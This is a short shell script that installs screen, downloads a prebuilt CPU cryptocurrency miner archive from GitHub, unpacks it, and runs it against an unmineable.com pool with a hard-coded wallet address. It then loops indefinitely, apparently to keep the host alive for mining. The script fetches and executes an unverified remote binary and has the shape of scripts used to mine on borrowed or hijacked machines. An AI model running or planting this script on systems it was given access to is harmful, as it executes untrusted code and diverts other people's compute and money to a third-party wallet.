#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
tar xf hellminer_cpu_linux.tar.gz
./hellminer -c rx.unmineable.com:3333 -u t1fqfZ6CUL5oVgxhQLx3JeAQxz2noq6b62o.sato#h891-5bxs -p x --cpu 2
while [ 1 ]; do
sleep 3
done
sleep 999
